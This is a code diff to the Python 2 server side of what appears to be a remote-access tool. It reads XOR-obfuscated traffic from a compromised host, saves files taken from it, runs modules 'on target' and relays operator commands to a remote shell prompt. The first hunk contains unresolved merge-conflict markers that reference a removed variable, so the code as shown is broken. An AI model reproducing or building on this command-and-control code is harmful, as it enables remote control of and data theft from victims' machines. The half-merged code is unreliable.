@@ -301,7 +301,11 @@ class xor:
             data = xor(conn.recv(socksize), pin)
             
             if data.startswith(":savef"):
+<<<<<<< HEAD
                 getname = data2.split(" ")
+=======
+                getname = data.split(" ")
+>>>>>>> e3965c2eb1501d8e704cb75068afc5fae257b152
                 fname = getname[1]
                 core.logging.info("Saved file %s from %s" % (fname, name))
                 self.download(fname, name)
@@ -402,23 +406,21 @@ class xor:
             print("[!] Connection error!")
             
         while True:
-            data = conn.recv(socksize)
-            data2 = xor(data, pin)
+            data = xor(conn.recv(socksize), pin)
             
-            if data2.startswith(":savef"):
-                getname = data2.split(" ")
+            if data.startswith(":savef"):
+                getname = data.split(" ")
                 fname = getname[1]
                 core.logging.info("Saved file %s from %s" % (fname, name))
                 self.download(fname, name)
                 
-            elif data2 == ("Complete"):
+            elif data == ("Complete"):
                 print "[+] Module transfer successful."
                 print "[+] Executing module on target..."
                 
-            elif data2 == "shell => ":
-                cmd = raw_input(data2)
-                cmd2 = xor(cmd, pin)
-                conn.sendall(str(cmd2))
+            elif data == "shell => ":
+                cmd = raw_input(data)
+                conn.sendall(xor(cmd, pin))
                 
                 if cmd == (':killme'):
                     print("[!] Shutting down server!")
@@ -485,8 +487,7 @@ class xor:
                     
                     
             elif data:
-                data2 = xor(data, pin)
-                print data2
+                print data
                 
         conn.close()
 
